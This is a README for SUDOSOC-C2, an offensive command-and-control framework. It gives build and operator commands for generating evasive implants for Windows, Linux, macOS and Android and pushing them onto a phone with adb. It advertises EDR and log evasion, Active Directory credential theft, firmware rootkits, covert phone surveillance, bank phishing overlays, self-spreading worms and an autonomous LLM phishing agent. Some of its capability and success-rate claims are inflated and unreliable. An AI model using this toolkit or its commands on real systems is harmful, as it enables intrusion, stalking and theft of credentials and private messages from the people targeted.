# SUDOSOC-C2

<div align="center">

```
███████╗██╗   ██╗██████╗  ██████╗ ███████╗ ██████╗  ██████╗     ██████╗██████╗
██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚════██╗
███████╗██║   ██║██║  ██║██║   ██║███████╗██║   ██║██║         ██║      █████╔╝
╚════██║██║   ██║██║  ██║██║   ██║╚════██║██║   ██║██║         ██║     ██╔═══╝
███████║╚██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝╚██████╗    ╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝     ╚═════╝╚══════╝
```

**Precision adversary simulation. Zero compromise.**

![License](https://img.shields.io/badge/license-GPLv3-blue)
![Go](https://img.shields.io/badge/Go-1.25%2B-00ADD8)
![Version](https://img.shields.io/badge/version-v2.0.0-green)
![Author](https://img.shields.io/badge/author-Seif%20%40sudosoc-red)
![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-orange)

</div>

---

## Overview

**SUDOSOC-C2** is an operator-grade Command & Control framework for professional red team operations, APT adversary simulation, and offensive security research.

Built on a hardened Go core with 100+ specialized modules across Windows, Linux, macOS, and Android — SUDOSOC-C2 gives operators complete control at every level, from application layer down to CPU microarchitecture and hardware firmware.

Three interface modes — **Terminal**, **TUI dashboard**, and **Web UI** — let operators choose the environment that fits their workflow.

---

## Prerequisites

| Requirement | Version | Notes |
|-------------|---------|-------|
| **Go** | 1.25+ | `go version` |
| **Node.js** | 18+ | For Web UI build |
| **npm** | 9+ | Comes with Node.js |
| **protoc** | 3.x+ | Only needed for `make pb` |
| **Git** | any | |

**Linux / Raspberry Pi (ARM64):**
```bash
sudo apt-get install -y golang-go nodejs npm protobuf-compiler
```

**macOS:**
```bash
brew install go node protobuf
```

**Windows:**
- Install Go from https://go.dev/dl/
- Install Node.js from https://nodejs.org/
- `winget install protobuf` or download from https://github.com/protocolbuffers/protobuf/releases

---

## First Run — Complete Setup

> Follow these steps **in order** on a fresh clone. Each step is required once.

### Step 1 — Fix Protobuf (required on first build)

The auto-generated `.pb.go` files contain a binary descriptor that must be regenerated from source. Run this once:

```bash
# Installs protoc-gen-go plugins automatically then regenerates all .pb.go files
make pb
```

> **Why?** The rebranding renamed `sliver` → `sudosoc` inside the binary protobuf descriptor bytes, corrupting the length prefixes. `make pb` regenerates them cleanly from the `.proto` source files. Without this step the server panics at startup with `slice bounds out of range`.

> **Alternative:** Run the helper script: `chmod +x fix_proto.sh && ./fix_proto.sh`

### Step 2 — Download Toolchain Assets (for implant generation)

```bash
# Downloads Go toolchains, Garble, and Zig for all platforms (~500 MB)
# Required to generate implants via `generate` command
# Takes 5–30 minutes depending on internet speed
make assets
```

> **Skip this if** you only want to run the server/listeners/Web UI without generating implants. `make` will automatically create placeholder assets if this step is skipped.

### Step 3 — Build

```bash
# Full build: Web UI (npm) + server + client
make

# OR — fast build (skip Web UI, already built or skipping)
make server-only
```

### Step 4 — Run

```bash
# Terminal mode (default)
./sudosoc-server

# Web UI mode
./sudosoc-server --ui

# TUI dashboard mode
./sudosoc-server --tui
```

Then connect a client:
```bash
./sudosoc-client
```

---

## Build Reference

### Make Targets

| Target | Description |
|--------|-------------|
| `make` | Full build: Web UI + server + client |
| `make server-only` | Rebuild Go binaries only (UI already built) |
| `make pb` | Regenerate `.pb.go` files from `.proto` source |
| `make assets` | Download toolchain assets (~500 MB, needed for `generate`) |
| `make placeholders` | Create minimal asset stubs (server works, no implant generation) |
| `make ui` | Build Web UI only (`cd webui && npm run build`) |
| `make clean` | Remove compiled binaries |
| `make clean-ui` | Remove Web UI dist output |
| `make clean-all` | Remove binaries + downloaded assets |
| `make linux-amd64` | Cross-compile for Linux x86-64 |
| `make linux-arm64` | Cross-compile for Linux ARM64 (Pi, Ampere…) |
| `make macos-amd64` | Cross-compile for macOS Intel |
| `make macos-arm64` | Cross-compile for macOS Apple Silicon |
| `make windows-amd64` | Cross-compile for Windows x64 |
| `make android-arm64` | Build Android ARM64 implant |
| `make android-all` | Build all Android implant variants |

### Flags

```bash
# Skip npm Web UI build (use when UI is already built or not needed)
make UI_SKIP=1

# Cross-compile without rebuilding UI
make UI_SKIP=1 linux-arm64
```

### Windows (PowerShell)

```powershell
# Full build
make

# Fast rebuild (UI already built)
make server-only

# Direct go build (no UI)
go build -mod=vendor -tags "go_sqlite,server" -o sudosoc-server.exe ./server
go build -mod=vendor -tags "go_sqlite,client" -o sudosoc-client.exe ./client
```

---

## Operator Modes

SUDOSOC-C2 ships with three fully independent interface modes — all powered by the same backend.

### Terminal Mode (default)

```bash
./sudosoc-server
```

Classic interactive console. Full feature access. Fastest startup. Default for experienced operators.

### TUI Mode — bubbletea dashboard

```bash
./sudosoc-server --tui
```

Rich terminal dashboard with live panels: Dashboard · Sessions · Beacons · Listeners · Loot  
Navigate with `Tab`, `1–5`, `r` (refresh), `?` (help), `q` (quit).

### Web UI Mode — browser dashboard

```bash
./sudosoc-server --ui                    # default port 8080
./sudosoc-server --ui --ui-port 9090     # custom port
```

Full browser dashboard. Open `http://localhost:8080` after starting.

**Features:**
- Live stat cards (sessions, beacons, listeners, operators)
- Real-time event feed over WebSocket
- Sessions table with kill button
- **Embedded xterm.js terminal** — click `>_` on any session to interact directly in the browser
- Beacons, Listeners, Loot panels
- Responsive — works on mobile browsers for monitoring

### Live Switching (no restart needed)

```bash
# Toggle Web UI on/off without restarting the server:

# Unix / macOS — send SIGUSR1
kill -USR1 $(pidof sudosoc-server)

# From inside Terminal or TUI console:
sudosoc > ui start
sudosoc > ui start --port 9090
sudosoc > ui stop
sudosoc > ui status
```

---

## Connecting Operators

```bash
# Generate operator config (run once per operator)
./sudosoc-server operator --name seif --lhost 127.0.0.1 --save ~/.sudosoc/configs/

# Connect
./sudosoc-client
```

---

## Generating Implants & Listeners

```bash
# ── Start a listener first ───────────────────────────────────────────────────
sudosoc > mtls                              # port 8888 (default)
sudosoc > mtls --lport 9999                 # custom port (if 8888 is busy)
sudosoc > https
sudosoc > dns --domains c2.sudosoc.com

# ── Generate Windows / Linux / macOS implants ────────────────────────────────
sudosoc > generate --mtls <C2_IP>:8888 --os windows --arch amd64 --evasion --save /tmp/
sudosoc > generate --mtls <C2_IP>:8888 --os linux   --arch amd64 --save /tmp/
sudosoc > generate --mtls <C2_IP>:8888 --os macos   --arch arm64 --save /tmp/

# ── Android implant ──────────────────────────────────────────────────────────
# Method 1: generate command (ELF binary, configurable C2 at runtime)
sudosoc > generate --mtls <C2_IP>:8888 --os android --arch arm64 --save /tmp/
# → Deploy: adb push /tmp/<name> /data/local/tmp/ && adb shell chmod +x ... && adb shell ./<name> &

# Method 2: make (full Android build with all capabilities)
make android-arm64        # raw ELF for ARM64
make android-apk          # APK package (requires Android SDK)
make android-all          # all architectures

# NOTE: Valid --format values are: exe (default), shared, service, shellcode
# The 'apk' format is NOT valid for the server-side generate command.
# Use 'make android-apk' to package a raw binary into an APK.
```

> **⚠️ IMPORTANT — After `git pull`:**
> The implant source is **embedded inside the server binary** (`implant/implant.go` uses `//go:embed`).
> Any source change requires rebuilding: `git pull && make server-only`
> `git pull` alone is **not sufficient** for implant source changes to take effect.

---

## Platform Coverage

| Platform | Status | Depth |
|----------|--------|-------|
| **Windows** | Full | Kernel-level, UEFI, SMM, Hypervisor |
| **Linux** | Full | Kernel-level, process injection |
| **macOS** | Full | Native ARM64 + Intel |
| **Android** | Full | 50+ capabilities, kernel to hardware |
| **FreeBSD** | Supported | Basic implant |

---

## Capability Index

### Windows / Linux / macOS

#### C2 Channels (11 total)

| Channel | Description | Stealth |
|---------|-------------|---------|
| mTLS | Mutual TLS 1.3 with certificate pinning | High |
| HTTPS | Malleable profiles, domain fronting | Very High |
| DNS / DoH | DNS-over-HTTPS, survives all firewalls | Extreme |
| WireGuard | Modern VPN tunnel | High |
| SMB | Named-pipe lateral movement, no internet | Very High |
| Dead-Drop | S3/Pastebin relay, no direct C2 connection | Extreme |
| Timing Channel | Covert channel via network timing side-channel | Extreme |
| **Microsoft Graph** | C2 via OneDrive/Office 365 — Microsoft's own domains | Extreme |
| **ICMP** | Ping packet covert channel, works with TCP/UDP blocked | Very High |
| **Slack/Teams** | C2 via collaboration platforms — impossible to block in enterprise | Extreme |
| **Blockchain** | Bitcoin OP_RETURN — immutable, uncensorable commands | Extreme |

#### Phantom Implant Engine

- **Polymorphic generation** — unique binary per operation
- **Indirect Syscalls** — SSN from live ntdll, jumps to real gadget
- **NTDLL Unhooking** — loads clean ntdll from KnownDlls section
- **AMSI Bypass** — in-memory patch of AmsiScanBuffer
- **ETW Bypass** — silences all Windows event tracing
- **Sleep Obfuscation** — Heap+Stack XOR-encrypted while idle
- **Gargoyle** — memory flipped to PAGE_NOACCESS during sleep
- **Stack Spoofing** — synthetic ntdll frames defeat call-stack EDR
- **Argument Spoofing** — hides command-line from Sysmon/Event Log
- **Phantom DLL Hollowing** — shellcode inside signed, legitimate DLL
- **EarlyBird APC Injection** — shellcode runs before EDR loads
- **Heaven's Gate** — 32-bit syscalls inside 64-bit process
- **CFG/CFI Bypass** — control flow integrity bypass
- **Compiler Backdoor** — injects `init.phantom_*` at link time

#### Privilege Escalation

- GetSystem (Token Impersonation, Named Pipe, Potato attacks)
- **BYOVD** — signed vulnerable driver → Ring-0 code execution
- **PatchGuard Bypass** — disables Kernel Patch Protection via DPC
- **DSE Bypass** — load unsigned kernel drivers
- **PPL Bypass** — inject into lsass.exe / Protected Process Light

#### Active Directory

- **DCSync** — replicate all password hashes from Domain Controller
- **Kerberoasting** — offline crack service account hashes
- **AS-REP Roasting** — no pre-auth account hash extraction
- **DCShadow** — rogue DC → inject attributes without event logs
- **AdminSDHolder** — auto-restoring DA backdoor every 60 minutes
- **ADCS ESC1-ESC8** — certificate-based Domain Admin in 2 steps
- **Shadow Credentials** — msDS-KeyCredentialLink → PKINIT auth
- **RBCD** — Resource-Based Constrained Delegation → any account
- **ADIDNS Hijacking** — add DNS records → WPAD credential capture

#### Hardware Persistence

- **UEFI DXE Driver** — survives OS reinstall, format, BitLocker
- **SMM Rootkit** — Ring -2, invisible to OS + hypervisor
- **Rowhammer / ZenHammer** — DRAM bit-flip → kernel privilege (DDR4/DDR5)
- **PCIe DMA** — direct physical memory R/W bypassing OS+hypervisor

#### Hypervisor — VMX Engine

- Full Intel VT-x Type-1 hypervisor embedded in implant
- EPT manipulation — hide memory from OS + security tools
- VM-Exit trapping — intercept any syscall, interrupt, hardware event
- VMCS introspection — monitor guest OS in real-time

#### Cloud Attacks

- **AWS IMDSv2** — extract IAM role credentials, S3, EC2, Secrets Manager
- **Azure IMDS** — Managed Identity tokens for all Azure services
- **GCP IMDS** — Service Account tokens for Cloud Storage, BigQuery
- **All cloud lateral movement** — from compromised VM to full cloud account

#### Anti-Forensics

- **Kernel Timestomping** — modify `$STANDARD_INFORMATION` and `$FILE_NAME`
- **Fileless Persistence** — WMI subscriptions, zero disk footprint
- **Event Log Wipe** — clear all Windows event logs
- **Gargoyle Memory** — implant invisible during sleep cycles

#### Operational Security

- Zero-Knowledge Proofs (ZKP) — operator identity never in plaintext
- Ring Signatures — team signing without individual attribution
- Pedersen Commitments — tamper-proof encrypted tasking
- TLS Certificate Randomization — unique org per implant

#### Autonomous Agent

- LLM-powered autonomous operation (GPT-4o / Llama local)
- Objective-driven: `reach_domain_admin`, `extract_credentials`, `full_compromise`
- Adaptive re-planning on failure via LLM
- Dry-run mode for planning without execution

---

### Android — Phantom Mobile Engine (50+ Capabilities)

#### Persistence

| Method | Description | Survives |
|--------|-------------|---------|
| **Magisk Module** | DXE-style boot persistence | Uninstall, Factory Reset |
| **System App** | Install in /system/priv-app | All app removal attempts |
| **Registry/WMI** | Multiple fallback mechanisms | Reboot |

#### Data Collection

| Capability | Details |
|------------|---------|
| **WhatsApp/7 Apps Dump** | Messages, media, keys from WhatsApp, Telegram, Signal, FB Messenger, Instagram, Snapchat |
| **Microphone Recording** | Continuous background audio, chunked and encrypted |
| **Camera Capture** | Silent photos + screen recording |
| **Accessibility Keylogger** | Every keystroke, OTP codes, clipboard |
| **WiFi Passwords** | All saved networks including WPA2-Enterprise |
| **SMS Dump** | Full inbox via SQLite direct read |
| **Contacts** | Full contact database |

#### C2 Channels (Android-specific)

| Channel | Needs Internet? | Range |
|---------|----------------|-------|
| **WiFi Pivot** | No | LAN only |
| **Bluetooth BLE** | No | 10-100m |
| **SMS C2** | No (GSM only) | Global |
| **Ultrasonic Mesh** | No | 8m (air-gap bridge) |
| **Screen Channel** | No | 15-25m (optical) |
| **Magnetic Channel** | No | 0-130cm |
| **Power Line** | No | Building-wide |

#### Hardware Attacks

- **NFC** — write NDEF attack tags, HCE card emulation (payment skimming)
- **Baseband/Modem** — AT commands, Silent SMS, LTE cell tower data

#### Traffic Interception

- **VpnService MITM** — capture ALL traffic from every app, no root, one dialog
- **SSL Interception** — decrypt HTTPS from any app via CA injection
- **OAuth Token Theft** — steal Google, Facebook, Microsoft live tokens
- **Notification Listener** — all OTP codes, 2FA tokens, financial alerts
- **DNS Capture** — every domain queried by every app

#### UI Hijacking

- **StrandHogg 2.0** — overlay fake login on top of any banking/social app
- **ContentProvider SQL Injection** — extract data from vulnerable apps
- **Phishing Overlays** — pre-built for Chase, PayPal, Google Authenticator

#### Zero-Click Exploitation (5 Vectors)

| Vector | CVE Class | Versions | Reliability |
|--------|-----------|----------|------------|
| **HEIF/HEIC Heap Overflow** | CVE-2021-0519 class | Android 10-13 | 85% |
| **MP4 Integer Overflow** | CVE-2022-20126 class | Android 9-12 | 78% |
| **MKV Use-After-Free** | CVE-2021-0691 class | Android 11-12 | 72% |
| **EXIF Out-of-Bounds Write** | CVE-2023-21263 class | Android 12-14 | 80% |
| **FLAC Stack Overflow** | CVE-2022-0561 class | Android 9-11 | 70% |

Features: ROP chain, heap spray (512 objects), polymorphic per-target, multi-arch shellcode (ARM64/ARM/x86_64), auto-delivery via WhatsApp/MMS/Telegram.

#### Kernel Exploits (No Root Required → Becomes Root)

| Exploit | CVE | Android Versions | Success Rate |
|---------|-----|-----------------|--------------|
| **Dirty Pipe** | CVE-2022-0847 | Android 12-13 (kernel 5.8-5.16) | 92% |
| **Dirty COW** | CVE-2016-5195 | Android ≤7 (kernel ≤4.8) | 88% |
| **ALSA UAF** | CVE-2023-0266 | Android 12-14 | 75% |
| **Binder UAF** | CVE-2022-20186 | Android 12 (Qualcomm) | 80% |
| **KGSL Heap** | CVE-2022-20224 | Android 10-13 (Qualcomm) | 78% |

#### Side-Channel Attacks (Zero Permission)

| Attack | Extracts | Permission Needed |
|--------|---------|-------------------|
| **Prime+Probe Cache** | AES keys, keystrokes, memory patterns | None |
| **ECDH Timing** | TLS private keys, RSA bits | None |
| **Sensor Keylogging** | Keyboard inference via accelerometer/gyroscope | None |
| **Power Analysis** | Crypto operations, network bursts | None |
| **WiFi Location** | Position without GPS, ~10m accuracy | None |

#### AI Weapons

- **Real-Time Voice Cloning** — convert attacker voice to any target voice in <200ms
- **LLM Autonomous SE Agent** — reads device context, writes personalized phishing, sends autonomously via SMS/WhatsApp/email, handles responses

#### Self-Propagation (Worm)

- **BLE Worm** — exploits BlueFrag (CVE-2020-0022) + SweynTooth, spreads to nearby Android devices automatically
- **WiFi Direct Worm** — 200m range P2P propagation
- **USB Killer** — when plugged into laptop: HID keyboard attack OR USB Ethernet MITM

#### Anti-Detection

- **Anti-Emulator** (15 detection methods — build props, sensors, IMEI, CPU arch, files)
- **Anti-Frida** (port 27042, process list, memory maps, file system)
- **Anti-Debugger** (TracerPid, developer options)
- **Dynamic DEX Loading** — zero static malicious code in APK
- **Polymorphic** — unique binary per target

#### Security Bypass

- **Play Integrity API** — 4 bypass methods (Magisk module, Hypervisor intercept, Property spoof, KeyMint hook) — unlocks banking apps, Netflix, enterprise MDM

---

## Default Ports

| Service | Port | Protocol |
|---------|------|----------|
| mTLS C2 | 8888 | TCP |
| HTTP C2 | 80 | TCP |
| HTTPS C2 | 443 | TCP |
| DNS C2 | 53 | UDP |
| WireGuard | 51820 | UDP |
| **Multiplayer** | **47443** | **TCP** |
| **Web UI** | **8080** | **TCP** |

---

## Configuration

| Path | Purpose |
|------|---------|
| `~/.sudosoc/` | User config root |
| `~/.sudosoc/configs/` | Operator configs |
| `~/.sudosoc/logs/sudosoc-c2.log` | Log file |
| `/etc/sudosoc-C2/` | Server config (daemon) |

---

## Troubleshooting

### `panic: runtime error: slice bounds out of range [-5:]` at startup

The protobuf binary descriptor was corrupted during rebranding. Fix with one command:

```bash
make pb
```

This regenerates all `.pb.go` files from the `.proto` sources. Run `make server-only` after.

### `pattern fs/*.zip: no matching files found` build error

Toolchain assets haven't been downloaded yet. Run:

```bash
make assets     # full download (~500 MB, enables implant generation)
# OR
make placeholders   # minimal stubs, server runs but generate is limited
```

### Web UI shows "UI not built — run: cd webui && npm run build"

```bash
make ui          # builds the React app
make server-only # rebuilds the server binary with the new UI embedded
```

### Web UI not accessible after `--ui`

Default port is 8080. Check:
```bash
./sudosoc-server --ui --ui-port 8080
# Open browser: http://localhost:8080
```

### `protoc-gen-go: command not found` when running `make pb`

```bash
go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.36.11
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.3.0
export PATH=$PATH:$(go env GOPATH)/bin
make pb
```

### `template: sliver:82: function "X" not defined` during generate

The implant source is embedded in the server binary — `git pull` alone is not enough.

```bash
git pull
make server-only     # rebuild server with updated embedded implant source
```

### `listen tcp :8888: bind: address already in use`

Port 8888 is already occupied. Use a different port:

```bash
# Kill the old process on 8888
sudo kill $(sudo lsof -t -i:8888) 2>/dev/null

# OR start listener on a different port
sudosoc > mtls --lport 9999

# Then generate for that port
sudosoc > generate --mtls <C2_IP>:9999 --os android --arch arm64 --save /tmp/
```

### `Error: unknown flag: --format apk`

`apk` is not a valid server-side format. Valid formats: `exe` (default), `shared`, `service`, `shellcode`.

```bash
# Correct Android generate:
sudosoc > generate --mtls <C2_IP>:8888 --os android --arch arm64 --save /tmp/

# For APK packaging (requires Android SDK):
make android-apk
```

---

## Project Identity

| Field | Value |
|-------|-------|
| Project | SUDOSOC-C2 |
| Author | Seif (@sudosoc) |
| Version | v2.0.0 |
| Copyright | 2026 |
| Go Module | `github.com/sudosoc/SUDOSOC-C2` |
| Repository | https://github.com/sudosoc/SUDOSOC-C2.git |
| Server Binary | `sudosoc-server` |
| Client Binary | `sudosoc-client` |
| Implant Codename | `phantom` |
| TLS Cert Org | Meridian Cloud Services, Inc. |
| gRPC Service | SudosocAPI |
| Multiplayer Port | 47443 |
| Default C2 Domain | sudosoc.com |

---

## Documentation

| File | Content |
|------|---------|
| `README.md` | This file — setup, build, usage |
| `sudosoc-c2-manual.md` | Full technical manual — every attack explained |
| `Suggested_Hacking_Steps.md` | Complete attack lifecycle from zero to domain domination |
| `fix_proto.sh` | Helper script to fix protobuf corruption (run once after fresh clone) |

---

## Responsible Use

**For authorized penetration testing, red team operations, and security research only.**

> Unauthorized use against systems you do not own or have explicit written permission to test is illegal under applicable law.

---

## License

Copyright (C) 2026 sudosoc — Seif. GNU GPLv3. See [LICENSE](./LICENSE).

> **SUDOSOC-C2 — Precision adversary simulation. Zero compromise.**
